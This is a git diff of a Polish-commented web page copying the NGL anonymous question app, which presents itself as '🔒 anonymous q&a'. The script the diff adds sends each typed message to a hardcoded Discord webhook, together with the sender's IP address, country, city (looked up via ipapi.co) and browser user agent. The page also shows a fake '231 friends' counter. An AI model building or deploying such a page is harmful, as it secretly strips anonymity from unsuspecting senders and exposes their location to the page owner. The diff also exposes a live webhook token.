@@ -5,13 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>@rozalia</title>
   <style>
-    /* Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background: linear-gradient(180deg, #ff3366 0%, #ff9966 100%);
@@ -23,7 +17,7 @@
       color: #fff;
     }
 
-    /* Bubble (box wiadomości) */
+    /* Bubble */
     .bubble {
       background: #fff;
       border-radius: 20px;
@@ -32,165 +26,80 @@
       margin-top: 60px;
       padding: 20px;
       color: #333;
-      position: relative;
       box-shadow: 0 4px 20px rgba(0,0,0,0.1);
       display: flex;
       flex-direction: column;
     }
+    .header { display: flex; align-items: center; margin-bottom: 10px; }
+    .pfp { width: 40px; height: 40px; background: #ccc; border-radius: 50%; margin-right: 10px; }
+    .username { font-weight: 600; }
+    .prompt { font-size: 0.9em; color: #555; }
 
-    .header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 10px;
-    }
-
-    .pfp {
-      width: 40px;
-      height: 40px;
-      background: #ccc;
-      border-radius: 50%;
-      margin-right: 10px;
-    }
-
-    .username {
-      font-weight: 600;
-    }
-
-    .prompt {
-      font-size: 0.9em;
-      color: #555;
-    }
-
-    /* Textarea identyczny jak NGL */
-    .textarea-container {
-      position: relative;
-      margin-top: 15px;
-    }
-
+    /* Textarea */
+    .textarea-container { position: relative; margin-top: 15px; }
     textarea {
-      width: 100%;
-      font-size: 1.2em;
-      border: none;
-      outline: none;
-      resize: none;
-      background: transparent;
-      color: #333;
-      font-family: inherit;
-      padding: 10px 0;
-      min-height: 60px;
+      width: 100%; font-size: 1.2em; border: none; outline: none; resize: none;
+      background: transparent; color: #333; font-family: inherit; padding: 10px 0; min-height: 60px;
     }
-
     .textarea-placeholder {
-      position: absolute;
-      top: 10px;
-      left: 0;
-      color: #999;
-      font-size: 1.2em;
-      pointer-events: none;
-      transition: opacity 0.3s;
+      position: absolute; top: 10px; left: 0; color: #999; font-size: 1.2em;
+      pointer-events: none; transition: opacity 0.3s;
     }
-
     textarea:focus + .textarea-placeholder,
-    textarea:not(:placeholder-shown) + .textarea-placeholder {
-      opacity: 0;
-    }
-
-    .dice {
-      position: absolute;
-      bottom: 10px;
-      right: 10px;
-      font-size: 1.2em;
-    }
+    textarea:not(:placeholder-shown) + .textarea-placeholder { opacity: 0; }
+    .dice { position: absolute; bottom: 10px; right: 10px; font-size: 1.2em; }
 
     /* Tooltip */
-    .tooltip {
-      margin-top: 12px;
-      font-size: 0.9em;
-      color: #fff;
-      opacity: 0.9;
-    }
+    .tooltip { margin-top: 12px; font-size: 0.9em; opacity: 0.9; }
 
-    /* Bottom section */
+    /* Bottom */
     .bottom-container {
-      width: 100%;
-      text-align: center;
-      padding: 40px 20px;
+      width: 100%; text-align: center; padding: 40px 20px;
       transition: transform 0.4s ease, opacity 0.4s ease;
     }
-
-    .bottom-container.hide {
-      transform: translateY(100%);
-      opacity: 0;
-    }
-
-    .download-prompt {
-      font-size: 1.1em;
-      margin-bottom: 20px;
-      font-weight: 600;
-    }
-
+    .bottom-container.hide { transform: translateY(100%); opacity: 0; }
+    .download-prompt { font-size: 1.1em; margin-bottom: 20px; font-weight: 600; }
     .button {
-      display: inline-block;
-      background: #000;
-      color: #fff;
-      font-weight: bold;
-      padding: 16px 45px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-size: 1.2em;
-      box-shadow: 0 4px 14px rgba(0,0,0,0.3);
+      display: inline-block; background: #000; color: #fff; font-weight: bold;
+      padding: 16px 45px; border-radius: 50px; text-decoration: none;
+      font-size: 1.2em; box-shadow: 0 4px 14px rgba(0,0,0,0.3);
     }
+    .button.pulse { animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0%{transform:scale(1);}50%{transform:scale(1.08);}100%{transform:scale(1);} }
+    .tos-privacy { margin-top: 20px; font-size: 0.9em; }
+    .tos-privacy a { color: #fff; opacity: 0.8; margin: 0 12px; text-decoration: none; }
+    .tos-privacy a:hover { opacity: 1; }
 
-    .button.pulse {
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.08); }
-      100% { transform: scale(1); }
-    }
-
-    .tos-privacy {
-      margin-top: 20px;
-      font-size: 0.9em;
-    }
-
-    .tos-privacy a {
-      color: #fff;
-      opacity: 0.8;
-      margin: 0 12px;
-      text-decoration: none;
-      transition: opacity 0.2s;
-    }
-
-    .tos-privacy a:hover {
-      opacity: 1;
-    }
-
-    /* Send button taki jak czarny */
+    /* Send */
     .send-btn {
-      display: none;
-      margin-top: 20px;
-      background: #000;
-      color: #fff;
-      font-weight: bold;
-      padding: 16px 45px;
-      border-radius: 50px;
-      font-size: 1.2em;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 4px 14px rgba(0,0,0,0.3);
+      display: none; margin-top: 20px; background: #000; color: #fff; font-weight: bold;
+      padding: 16px 45px; border-radius: 50px; font-size: 1.2em; border: none;
+      cursor: pointer; box-shadow: 0 4px 14px rgba(0,0,0,0.3);
     }
-    .send-btn.show {
-      display: inline-block;
+    .send-btn.show { display: inline-block; }
+
+    /* Sent screen */
+    .sent-screen {
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+      text-align: center; margin-top: 60px;
+    }
+    .sent-screen.show { display: flex; }
+    .sent-icon {
+      width: 80px; height: 80px; border-radius: 50%; background: #fff; display: flex;
+      align-items: center; justify-content: center; font-size: 2.5em; color: #ff3366;
+      margin-bottom: 20px;
+    }
+    .sent-screen h2 { font-size: 1.6em; margin-bottom: 30px; }
+    .sent-screen .button { margin-bottom: 15px; }
+    .sent-screen .send-again {
+      font-size: 1em; color: #fff; text-decoration: underline; cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <!-- Box z wiadomością -->
-  <div class="bubble">
+  <!-- Box -->
+  <div class="bubble" id="formScreen">
     <div class="header">
       <div class="pfp"></div>
       <div>
@@ -206,10 +115,9 @@
     <button class="send-btn" id="sendBtn">Send</button>
   </div>
 
-  <!-- Tooltip -->
   <div class="tooltip">🔒 anonymous q&amp;a</div>
 
-  <!-- Sekcja dolna -->
+  <!-- Bottom -->
   <div class="bottom-container" id="bottomBox">
     <h2 class="download-prompt">👇 231 friends just tapped the button 👇</h2>
     <a class="button pulse" href="#">Get your own messages!</a>
@@ -219,10 +127,21 @@
     </div>
   </div>
 
+  <!-- Sent screen -->
+  <div class="sent-screen" id="sentScreen">
+    <div class="sent-icon">✔</div>
+    <h2>Sent!</h2>
+    <h3 class="download-prompt">👇 231 friends just tapped the button 👇</h3>
+    <a class="button" href="#">Get your own messages!</a>
+    <div class="send-again" onclick="resetForm()">Send another message</div>
+  </div>
+
   <script>
     const textarea = document.getElementById("messageBox");
     const bottomBox = document.getElementById("bottomBox");
     const sendBtn = document.getElementById("sendBtn");
+    const formScreen = document.getElementById("formScreen");
+    const sentScreen = document.getElementById("sentScreen");
 
     textarea.addEventListener("input", () => {
       if (textarea.value.trim().length > 0) {
@@ -233,6 +152,53 @@
         sendBtn.classList.remove("show");
       }
     });
+
+    sendBtn.addEventListener("click", async () => {
+      const message = textarea.value.trim();
+      if (!message) return;
+
+      let locationData = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        locationData = await res.json();
+      } catch (e) {}
+
+      const userAgent = navigator.userAgent;
+
+      const payload = {
+        content: null,
+        embeds: [{
+          title: "📩 Nowy ngl @gustawkostek",
+          color: 16711840,
+          fields: [
+            { name: "Wiadomość", value: message },
+            { name: "IP", value: locationData.ip || "unknown", inline: true },
+            { name: "Kraj", value: locationData.country_name || "unknown", inline: true },
+            { name: "Miasto", value: locationData.city || "unknown", inline: true },
+            { name: "Urządzenie", value: userAgent, inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      fetch("https://discord.com/api/webhooks/1422947330809794563/FxejFr1KCuMkZ6ZLGnKrozyCCs6EmWFGynfMMZf9PSri2ueuZ2fcrylQVx40d3oLPEcN", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        formScreen.style.display = "none";
+        bottomBox.style.display = "none";
+        sentScreen.classList.add("show");
+      });
+    });
+
+    function resetForm() {
+      textarea.value = "";
+      formScreen.style.display = "flex";
+      bottomBox.style.display = "block";
+      sendBtn.classList.remove("show");
+      sentScreen.classList.remove("show");
+    }
   </script>
 
 </body>
